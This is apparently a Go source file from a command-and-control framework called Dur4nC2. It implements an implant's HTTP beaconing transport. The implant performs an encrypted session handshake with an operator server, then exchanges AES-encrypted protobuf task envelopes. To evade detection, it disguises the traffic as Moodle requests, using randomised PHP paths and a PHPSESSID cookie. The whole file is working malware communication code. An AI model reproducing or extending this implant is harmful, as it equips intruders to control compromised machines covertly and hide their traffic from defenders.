package transport

import (
	"Dur4nC2/implant/cryptography"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/domain/models"
	"bytes"
	cryptoRand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"golang.org/x/crypto/nacl/box"
	"google.golang.org/protobuf/proto"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"time"
)

// only for testing
var EccServerPublicKey string

// ImplantHTTPClient - Helper struct to keep everything together
type ImplantHTTPClient struct {
	ID         string
	URL        string
	Domain     string
	HTTPClient *http.Client
	PathPrefix string
	SessionCtx *cryptography.CipherContext
	SessionID  string
	Closed     bool
}

func HTTPBeacon(implantConfig models.ImplantConfig) (*Beacon, error) {
	connection, err := HTTPStartConnection(implantConfig)
	if err != nil {
		return nil, err
	}
	beacon := &Beacon{
		HTTPConnection: connection,
	}
	return beacon, nil
}
func HTTPStartConnection(implantConfig models.ImplantConfig) (*ImplantHTTPClient, error) {
	fmt.Println("[implant] Opening client connection to ", implantConfig.URL)
	// If we're using default ports then switch to 80
	//if strings.HasSuffix(address, ":443") {
	//	address = fmt.Sprintf("%s:80", address[:len(address)-4])
	//}
	client := httpClient(implantConfig.URL)
	client.PathPrefix = implantConfig.PathPrefix
	err := client.SessionInit()
	if err != nil {
		return nil, err
	}
	return client, nil
}
func (s *ImplantHTTPClient) SessionInit() error {
	sKey := cryptography.RandomKey()
	//fmt.Println("KEY: ", sKey)
	s.SessionCtx = cryptography.NewCipherContext(sKey)
	httpSessionInit := &implantpb.HTTPSessionInit{Key: sKey[:]}
	data, _ := proto.Marshal(httpSessionInit)

	var nonce [24]byte
	if _, err := io.ReadFull(cryptoRand.Reader, nonce[:]); err != nil {
		fmt.Println("Error in reader")
	}
	implant_public_key_raw, _ := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
	var implant_public_key [32]byte
	copy(implant_public_key[:], implant_public_key_raw)
	implant_private_key_raw, _ := base64.RawStdEncoding.DecodeString(cryptography.ECCPrivateKey)
	var implant_private_key [32]byte
	copy(implant_private_key[:], implant_private_key_raw)
	server_public_key_raw, _ := base64.RawStdEncoding.DecodeString(cryptography.ECCServerPublicKey)
	var server_public_key [32]byte
	copy(server_public_key[:], server_public_key_raw)
	ciphertext := box.Seal(nonce[:], data, &nonce, &server_public_key, &implant_private_key)
	if len(ciphertext) < 24 {
		return errors.New("ciphertext too short")
	}
	digest := sha256.Sum256((implant_public_key)[:])
	encryptedSessionInit := make([]byte, 32+len(ciphertext))
	copy(encryptedSessionInit, digest[:])
	copy(encryptedSessionInit[32:], ciphertext)

	reader := bytes.NewReader(encryptedSessionInit)
	rnd := rand.Intn(9999999)
	rndStr := strconv.FormatInt(int64(rnd), 10)
	req, reqErr := http.NewRequest(http.MethodPost, s.URL+"/articles/"+rndStr, reader)
	if reqErr != nil {
		err := fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		return err
	}
	req.Close = true
	resp, err := s.HTTPClient.Do(req)
	if err != nil {
		return err
	}
	switch resp.StatusCode {
	case http.StatusOK:
		respData, err := ioutil.ReadAll(resp.Body)
		sessionID, err := s.SessionCtx.Decrypt(respData)
		s.SessionID = string(sessionID)
		if err != nil {
			log.Printf("[implant][transport] response read error: %s", err)
			return err
		}
		defer resp.Body.Close()
		if err != nil {
			log.Printf("[implant][transport] response decoder failure: %s", err)
			return err
		}
		if err != nil {
			log.Printf("[transport] response decrypt failure: %s", err)
			return err
		}
		fmt.Printf("[implant][transport] New session id: %v\n", s.SessionID)
	default:
		fmt.Println("[implant] non 200")
		return errors.New("invalid message")
	}
	return nil
}

func (s *ImplantHTTPClient) ReadEnvelope(beaconID string) (*implantpb.Envelope, error) {
	req, reqErr := http.NewRequest(http.MethodGet, s.URL+getGetUrl(), nil)
	if reqErr != nil {
		err := fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		return nil, err
	}
	req.AddCookie(&http.Cookie{
		Domain:   s.Domain,
		Name:     "PHPSESSID",
		Value:    s.SessionID,
		Secure:   false,
		HttpOnly: true,
	})
	req.Header.Set("ETag", beaconID)
	resp, err := s.HTTPClient.Do(req)
	if err != nil {
		return nil, err
	}
	switch resp.StatusCode {
	case 202:
		// read response body
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(err)
		}
		// close response body
		resp.Body.Close()
		// decrypt message
		c, err := s.SessionCtx.DecryptAES(body)
		// marshall message
		envelope := &implantpb.Envelope{}
		err = proto.Unmarshal(c, envelope)
		if err != nil {
			return nil, err
		}
		return envelope, err
	case 401:
		return nil, errors.New("connection rejected")
	}
	return nil, nil
}
func (s *ImplantHTTPClient) WriteEnvelope(envelope *implantpb.Envelope) (*implantpb.Envelope, error) {
	data, err := proto.Marshal(envelope)
	if err != nil {
		log.Printf("[transport] failed to encode request: %s", err)
		return nil, err
	}

	encryptedData, err := s.SessionCtx.EncryptAES(data)
	if err != nil {
		log.Printf("[transport] failed to ecrypt request: %s", err)
		return nil, err
	}

	reader := bytes.NewReader(encryptedData)

	req, reqErr := http.NewRequest(http.MethodPost, s.URL+getPostUrl(), reader)
	if reqErr != nil {
		err = fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		return nil, err
	}
	req.AddCookie(&http.Cookie{
		Domain:   s.Domain,
		Name:     "PHPSESSID",
		Value:    s.SessionID,
		Secure:   false,
		HttpOnly: true,
	})
	resp, err := s.HTTPClient.Do(req)
	if err != nil {
		return nil, err
	}
	switch resp.StatusCode {
	case 202:
		// read response body
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(err)
		}
		// close response body
		resp.Body.Close()
		// decrypt message
		c, err := s.SessionCtx.DecryptAES(body)
		// marshall message
		envelope := &implantpb.Envelope{}
		err = proto.Unmarshal(c, envelope)
		if err != nil {
			return nil, err
		}
		return envelope, err
	case 401:
		return nil, errors.New("connection rejected")
	}
	return nil, nil
}

func httpClient(url string) *ImplantHTTPClient {
	var transport http.RoundTripper
	transport = &http.Transport{
		MaxIdleConns:    10,
		IdleConnTimeout: 1 * time.Nanosecond,
	}

	return &ImplantHTTPClient{
		HTTPClient: &http.Client{Transport: transport},
		URL:        url,
	}
}
func getGetUrl() string {
	urls := []string{
		"/lib/ajax/service-nologin.php",
		"/lib/ajax/setuserpref.php",
		"/login/index.php",
		"/message/output/popup/mark_notification_read.php",
		"/mod/assign/view.php",
		"/theme/yui_combo.php",
	}
	randomIndex := rand.Intn(len(urls))
	return urls[randomIndex]
}
func getPostUrl() string {
	urls := []string{
		"/lib/ajax/service-nologin.php",
		"/lib/ajax/service.php",
		"/lib/editor/atto/autosave-ajax.php",
		"/login/index.php",
	}
	randomIndex := rand.Intn(len(urls))
	return urls[randomIndex]
}
